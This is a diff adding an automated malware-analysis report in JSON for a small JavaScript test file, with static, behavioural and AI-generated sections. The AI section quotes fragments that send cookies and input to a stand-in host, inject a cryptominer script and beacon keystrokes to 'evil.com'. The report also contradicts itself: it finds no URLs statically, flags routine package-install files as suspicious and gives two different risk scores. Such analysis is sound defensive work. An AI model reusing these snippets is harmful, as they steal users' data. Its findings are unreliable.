@@ -1,0 +1,382 @@
+{
+  "static_analysis": {
+    "filename": "b0f61f3a-082d-403e-8438-9ddfaa19c5f2_test.js",
+    "size": 754,
+    "suspicious_indicators": [],
+    "suspicious_strings": [],
+    "yara_matches": [],
+    "entropy": 0,
+    "embedded_urls": [],
+    "ip_addresses": [],
+    "email_addresses": [],
+    "file_signatures": [],
+    "file_type": "ASCII text, with CRLF line terminators",
+    "mime_type": "text/plain",
+    "md5": "47ded633a6b0172bf8dacecc48784673",
+    "sha1": "57ebdd8be0c150f7f882d267bfb7817836cca8f1",
+    "sha256": "4252fafe6e2c126a897bf04a370bc8d46a39fb4ff4f9615ce42852e191791bc7",
+    "error": "'float' object has no attribute 'bit_length'"
+  },
+  "behavioral_analysis": {
+    "suspicious_activity": [
+      "System binary modification: /bin/slabtop",
+      "System binary modification: /bin/hugetop",
+      "System binary modification: /bin/tload",
+      "System binary modification: /bin/w",
+      "System binary modification: /bin/vmstat",
+      "System binary modification: /bin/pidwait",
+      "System config modification: /etc/terminfo",
+      "System config modification: /etc/terminfo/a",
+      "System config modification: /etc/terminfo/a/alacritty",
+      "System config modification: /etc/terminfo/a/ansi",
+      "System config modification: /etc/terminfo/d",
+      "System config modification: /etc/terminfo/d/dumb",
+      "System config modification: /etc/terminfo/r",
+      "System config modification: /etc/terminfo/r/rxvt",
+      "System config modification: /etc/terminfo/r/rxvt-256color",
+      "System config modification: /etc/terminfo/t",
+      "System config modification: /etc/terminfo/t/terminology-1.8.1",
+      "System config modification: /etc/terminfo/t/tmux",
+      "System config modification: /etc/terminfo/t/tmux-256color",
+      "System config modification: /etc/terminfo/t/terminator",
+      "System config modification: /etc/terminfo/t/terminology",
+      "System config modification: /etc/terminfo/t/terminology-0.6.1",
+      "System config modification: /etc/terminfo/t/terminology-1.0.0",
+      "System config modification: /etc/terminfo/x",
+      "System config modification: /etc/terminfo/x/xterm-xfree86",
+      "System config modification: /etc/terminfo/x/xterm",
+      "System config modification: /etc/terminfo/x/xterm-256color",
+      "System config modification: /etc/terminfo/x/xterm-color",
+      "System config modification: /etc/terminfo/g",
+      "System config modification: /etc/terminfo/g/gnome",
+      "System config modification: /etc/terminfo/g/gnome-256color",
+      "System config modification: /etc/terminfo/k",
+      "System config modification: /etc/terminfo/k/konsole-256color",
+      "System config modification: /etc/terminfo/k/konsole-linux",
+      "System config modification: /etc/terminfo/k/konsole",
+      "System config modification: /etc/terminfo/l",
+      "System config modification: /etc/terminfo/l/linux",
+      "System config modification: /etc/terminfo/p",
+      "System config modification: /etc/terminfo/p/putty",
+      "System config modification: /etc/terminfo/p/putty-256color",
+      "System config modification: /etc/terminfo/s",
+      "System config modification: /etc/terminfo/s/screen",
+      "System config modification: /etc/terminfo/s/screen-256color",
+      "System config modification: /etc/terminfo/s/st-0.8",
+      "System config modification: /etc/terminfo/s/st-16color",
+      "System config modification: /etc/terminfo/s/st-256color",
+      "System config modification: /etc/terminfo/s/st-0.6",
+      "System config modification: /etc/terminfo/s/st-0.7",
+      "System config modification: /etc/terminfo/s/st-0.8.5",
+      "System config modification: /etc/terminfo/s/st-direct",
+      "System config modification: /etc/terminfo/s/sun",
+      "System config modification: /etc/terminfo/v",
+      "System config modification: /etc/terminfo/v/vt100",
+      "System config modification: /etc/terminfo/v/vt102",
+      "System config modification: /etc/terminfo/v/vt200",
+      "System config modification: /etc/terminfo/v/vt220",
+      "System config modification: /etc/terminfo/v/vt52",
+      "System config modification: /etc/terminfo/v/vte",
+      "System config modification: /etc/terminfo/v/vte-256color",
+      "File operation: /lib/apk/db/lock",
+      "File operation: /var/log/apk.log",
+      "File operation: /usr/bin/strace-log-merge",
+      "File operation: /usr/bin/strace",
+      "File operation: /usr/lib/libintl.so.8",
+      "File operation: /usr/lib/libskarnet.so.2.14",
+      "File operation: /usr/lib/libelf.so.1",
+      "File operation: /usr/lib/libproc2.so.1",
+      "File operation: /usr/lib/libproc2.so.1.0.0",
+      "File operation: /usr/lib/libutmps.so.0.1.3.1",
+      "File operation: /usr/lib/libbz2.so.1",
+      "File operation: /usr/lib/libbz2.so.1.0.8",
+      "File operation: /usr/lib/libutmps.so.0.1",
+      "File operation: /usr/lib/libzstd.so.1",
+      "File operation: /usr/lib/liblzma.so.5.8.2",
+      "File operation: /usr/lib/libncursesw.so.6",
+      "File operation: /usr/lib/libzstd.so.1.5.7",
+      "File operation: /usr/lib/libfts.so.0",
+      "File operation: /usr/lib/libfts.so.0.0.0",
+      "File operation: /usr/lib/libintl.so.8.4.3",
+      "File operation: /usr/lib/libmd.so.0.1.0",
+      "File operation: /usr/lib/libncursesw.so.6.5",
+      "File operation: /usr/lib/libbsd.so.0",
+      "File operation: /usr/lib/libbsd.so.0.12.2",
+      "File operation: /usr/lib/libdw.so.1",
+      "File operation: /usr/lib/liblzma.so.5",
+      "File operation: /usr/lib/libmd.so.0",
+      "File operation: /usr/lib/libdw-0.194.so",
+      "File operation: /usr/lib/libskarnet.so.2.14.4.0",
+      "File operation: /usr/lib/libelf-0.194.so"
+    ],
+    "file_operations": [
+      "/tmp/b0f61f3a-082d-403e-8438-9ddfaa19c5f2_test.js",
+      "/bin/slabtop",
+      "/bin/hugetop",
+      "/bin/tload",
+      "/bin/w",
+      "/bin/vmstat",
+      "/bin/pidwait",
+      "/etc/terminfo",
+      "/etc/terminfo/a",
+      "/etc/terminfo/a/alacritty",
+      "/etc/terminfo/a/ansi",
+      "/etc/terminfo/d",
+      "/etc/terminfo/d/dumb",
+      "/etc/terminfo/r",
+      "/etc/terminfo/r/rxvt",
+      "/etc/terminfo/r/rxvt-256color",
+      "/etc/terminfo/t",
+      "/etc/terminfo/t/terminology-1.8.1",
+      "/etc/terminfo/t/tmux",
+      "/etc/terminfo/t/tmux-256color",
+      "/etc/terminfo/t/terminator",
+      "/etc/terminfo/t/terminology",
+      "/etc/terminfo/t/terminology-0.6.1",
+      "/etc/terminfo/t/terminology-1.0.0",
+      "/etc/terminfo/x",
+      "/etc/terminfo/x/xterm-xfree86",
+      "/etc/terminfo/x/xterm",
+      "/etc/terminfo/x/xterm-256color",
+      "/etc/terminfo/x/xterm-color",
+      "/etc/terminfo/g",
+      "/etc/terminfo/g/gnome",
+      "/etc/terminfo/g/gnome-256color",
+      "/etc/terminfo/k",
+      "/etc/terminfo/k/konsole-256color",
+      "/etc/terminfo/k/konsole-linux",
+      "/etc/terminfo/k/konsole",
+      "/etc/terminfo/l",
+      "/etc/terminfo/l/linux",
+      "/etc/terminfo/p",
+      "/etc/terminfo/p/putty",
+      "/etc/terminfo/p/putty-256color",
+      "/etc/terminfo/s",
+      "/etc/terminfo/s/screen",
+      "/etc/terminfo/s/screen-256color",
+      "/etc/terminfo/s/st-0.8",
+      "/etc/terminfo/s/st-16color",
+      "/etc/terminfo/s/st-256color",
+      "/etc/terminfo/s/st-0.6",
+      "/etc/terminfo/s/st-0.7",
+      "/etc/terminfo/s/st-0.8.5",
+      "/etc/terminfo/s/st-direct",
+      "/etc/terminfo/s/sun",
+      "/etc/terminfo/v",
+      "/etc/terminfo/v/vt100",
+      "/etc/terminfo/v/vt102",
+      "/etc/terminfo/v/vt200",
+      "/etc/terminfo/v/vt220",
+      "/etc/terminfo/v/vt52",
+      "/etc/terminfo/v/vte",
+      "/etc/terminfo/v/vte-256color",
+      "/lib/apk/db/lock",
+      "/var/log/apk.log",
+      "/usr/bin/strace-log-merge",
+      "/usr/bin/strace",
+      "/usr/lib/libintl.so.8",
+      "/usr/lib/libskarnet.so.2.14",
+      "/usr/lib/libelf.so.1",
+      "/usr/lib/libproc2.so.1",
+      "/usr/lib/libproc2.so.1.0.0",
+      "/usr/lib/libutmps.so.0.1.3.1",
+      "/usr/lib/libbz2.so.1",
+      "/usr/lib/libbz2.so.1.0.8",
+      "/usr/lib/libutmps.so.0.1",
+      "/usr/lib/libzstd.so.1",
+      "/usr/lib/liblzma.so.5.8.2",
+      "/usr/lib/libncursesw.so.6",
+      "/usr/lib/libzstd.so.1.5.7",
+      "/usr/lib/libfts.so.0",
+      "/usr/lib/libfts.so.0.0.0",
+      "/usr/lib/libintl.so.8.4.3",
+      "/usr/lib/libmd.so.0.1.0",
+      "/usr/lib/libncursesw.so.6.5",
+      "/usr/lib/libbsd.so.0",
+      "/usr/lib/libbsd.so.0.12.2",
+      "/usr/lib/libdw.so.1",
+      "/usr/lib/liblzma.so.5",
+      "/usr/lib/libmd.so.0",
+      "/usr/lib/libdw-0.194.so",
+      "/usr/lib/libskarnet.so.2.14.4.0",
+      "/usr/lib/libelf-0.194.so"
+    ],
+    "process_operations": [],
+    "network_attempts": [],
+    "registry_operations": [],
+    "system_calls": [],
+    "execution_success": false,
+    "quick_check": true
+  },
+  "ai_analysis": {
+    "vulnerabilities": [
+      {
+        "description": "Type:** Data Exfiltration",
+        "severity": "Medium"
+      },
+      {
+        "description": "Severity:** Critical",
+        "severity": "Critical"
+      },
+      {
+        "description": "Location in code:** `fetch('https://malicious-server.com/steal', ...)`",
+        "severity": "Medium"
+      },
+      {
+        "description": "Type:** Remote Code Execution (via Cryptomining)",
+        "severity": "Medium"
+      },
+      {
+        "description": "Severity:** High",
+        "severity": "High"
+      },
+      {
+        "description": "Location in code:** `document.head.appendChild(...)`",
+        "severity": "Medium"
+      },
+      {
+        "description": "Description:** The script dynamically injects another JavaScript file from `crypto-miner.net/payload.js` into the webpage. This is a classic method for delivering cryptomining malware, effectively using the victim's resources for the attacker's benefit.  The injected script could also contain further malicious code.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Type:** Keylogging",
+        "severity": "Medium"
+      },
+      {
+        "description": "Severity:** High",
+        "severity": "High"
+      },
+      {
+        "description": "Location in code:** `document.addEventListener('keypress', e => navigator.sendBeacon(...))`",
+        "severity": "Medium"
+      },
+      {
+        "description": "Description:** This code listens for every keypress event on the page and sends the pressed key to `evil.com/log` using `navigator.sendBeacon`. This allows the attacker to capture user keystrokes, potentially including passwords, credit card details, and other sensitive information. `sendBeacon` is particularly insidious as it attempts to send data even when the user navigates away from the page.",
+        "severity": "Low"
+      },
+      {
+        "description": "Type:** Cross-Site Scripting (XSS) - Potential",
+        "severity": "Medium"
+      },
+      {
+        "description": "Severity:** Medium",
+        "severity": "Medium"
+      },
+      {
+        "description": "Location in code:** `document.getElementById('user')?.value`",
+        "severity": "Medium"
+      },
+      {
+        "description": "Description:** While not directly exploitable in the provided snippet, if the 'user' input field is not properly sanitized, it could be vulnerable to XSS attacks. An attacker could inject malicious JavaScript code into the input field, which would then be executed when the `calculate` function is called.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Overall Risk: 95/100",
+        "severity": "Medium"
+      },
+      {
+        "description": "Malicious Website:** The file could be hosted on a compromised or malicious website and executed when a user visits the site.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Phishing Attack:** The file could be delivered via a phishing email, disguised as a legitimate script or attachment.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Cross-Site Scripting (XSS):** If the file is injected into a vulnerable website via XSS, it could compromise all users visiting that site.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Malvertising:** The file could be embedded in malicious advertisements displayed on legitimate websites.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Supply Chain Attack:** The file could be included as a dependency in a legitimate project, unknowingly infecting users who install that project.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Mitigation Steps:",
+        "severity": "Medium"
+      },
+      {
+        "description": "Block malicious domains:** Immediately block access to `malicious-server.com`, `crypto-miner.net`, and `evil.com` at the firewall and DNS level.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Remove the file:** If the file is found on a system, remove it immediately.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Revoke compromised credentials:** If user credentials may have been compromised, force password resets and revoke any affected tokens.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Detection Methods:",
+        "severity": "Medium"
+      },
+      {
+        "description": "Behavioral Analysis:** Implement behavioral analysis tools that can detect suspicious activity, such as the dynamic loading of scripts from unknown sources, excessive CPU usage, and network connections to known malicious domains.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Content Security Policy (CSP):** Implement a strict CSP to control the sources from which scripts can be loaded, preventing the execution of unauthorized code.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Endpoint Detection and Response (EDR):** Deploy EDR solutions to monitor endpoint activity and detect malicious behavior.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Web Application Firewall (WAF):** If the file is hosted on a web server, use a WAF to detect and block malicious requests.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Prevention Measures:",
+        "severity": "Medium"
+      },
+      {
+        "description": "Input Validation and Sanitization:**  Thoroughly validate and sanitize all user input to prevent XSS attacks.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Employee Training:** Educate employees about phishing attacks and other social engineering techniques.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Keep Software Updated:**  Keep all software, including web browsers and operating systems, up to date with the latest security patches.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Principle of Least Privilege:** Grant users only the minimum necessary permissions to access resources.",
+        "severity": "Medium"
+      },
+      {
+        "description": "Subresource Integrity (SRI):** Use SRI to verify the integrity of external JavaScript files.",
+        "severity": "Medium"
+      }
+    ],
+    "risk_assessment": " This file poses an extremely high risk. The combination of data exfiltration (cookies, user input), cryptomining, and keylogging makes it a highly malicious piece of code. The low entropy value is misleading; while it suggests a lack of packing, the malicious functionality is present in plain text, making it easily deployable. The use of `sendBeacon` for keylogging increases the persistence and stealth of the attack. The potential for XSS further elevates the risk.",
+    "recommendations": [],
+    "threat_vectors": [],
+    "analysis_time": 30.50461745262146,
+    "model_used": "gemma-3-27b-it",
+    "impact_analysis": {},
+    "raw_response": "## Security Analysis: b0f61f3a-082d-403e-8438-9ddfaa19c5f2_test.js\n\nHere's a comprehensive security analysis of the provided JavaScript file:\n\n**1. VULNERABILITIES DETECTED:**\n\n*   **Type:** Data Exfiltration\n    *   **Severity:** Critical\n    *   **Location in code:** `fetch('https://malicious-server.com/steal', ...)`\n    *   **Description:** This code sends user input from a field with ID 'user' and the user's cookies to a malicious server (`malicious-server.com`). This is a clear data exfiltr..."
+  },
+  "risk_score": 60,
+  "threat_level": "HIGH",
+  "summary": {
+    "quick_verdict": "\ud83d\udea8 High risk - Recommend quarantine",
+    "key_findings": [
+      "Behavioral: 89 suspicious activities",
+      "AI: 1 critical vulnerabilities",
+      "AI: 2 high-risk vulnerabilities"
+    ],
+    "risk_breakdown": {
+      "static_contribution": 0,
+      "behavioral_contribution": 30,
+      "ai_contribution": 30
+    },
+    "action_required": "Exercise extreme caution. Analyze in isolated environment only."
+  }
+}
